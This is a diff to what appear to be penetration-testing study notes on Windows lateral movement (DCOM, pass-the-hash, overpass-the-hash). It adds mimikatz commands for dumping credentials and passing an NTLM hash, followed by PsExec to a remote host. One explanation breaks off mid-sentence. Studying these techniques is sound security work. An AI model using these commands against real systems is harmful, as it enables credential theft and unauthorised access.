@@ -59,9 +59,7 @@ To execute the command remotely, PsExec performs the following tasks:
 
 
 ##### DCOM
-
-
-[[Passing the hash]]
+The protocol used in the New-CIMSession commandlet.
 
 
 ##### Pass-the-hash
@@ -69,4 +67,21 @@ To execute the command remotely, PsExec performs the following tasks:
 [[Passing the hash]]
 
 ##### Overpass-the-hash
-Overpassing the hash means using it 
+Overpassing the hash means using the password hash as a Kerberos ticket.
+Using this hash, we can create a KRBTGT in the name of that user, which we can use `mimikatz` to spawn a process with.
+When a user requests any domain service (SMB, login or such), a KRBTGT in the name of that 
+
+To exploit:
+```
+sekurlsa::logonpasswords
+// Use the hash for the next step
+
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+
+// At this point, a new powershell window will pop up. To get access to the user on another PC:
+.\PsExec.exe \\files04 cmd
+```
+
+
+##### Passing the ticket
+[[Pass the ticket]]
